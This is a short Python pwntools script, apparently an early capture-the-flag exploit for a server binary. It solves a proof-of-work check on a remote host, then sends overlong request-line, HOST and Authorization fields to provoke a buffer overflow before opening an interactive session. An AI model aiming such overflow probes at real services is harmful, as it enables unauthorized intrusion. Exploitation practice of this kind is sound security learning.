#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
from hashlib import sha256
from pwnlib.util.iters import bruteforce
context.log_level="debug"
pwn_file="./xx_easy_server"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
def proof_of_work(sol,chal):
    #chal = ''.join(random.choice(string.letters+string.digits) for _ in xrange(16))
    return sha256(chal + sol).hexdigest().startswith('00000')

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("49.4.91.205",31337)
    prefix = r.recvline()[:-1]
    r.sendline(bruteforce(lambda x : proof_of_work(x,prefix),string.letters + string.digits, method = 'fixed',length = 4))
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()


r.sendline("get /%s 123"%("a"*9999))
r.sendline("HOST: %s"%("a"*0x100))
r.sendline("Authorization: %s"%("a"*0x100))
debug()
r.sendline("\n")




r.interactive()
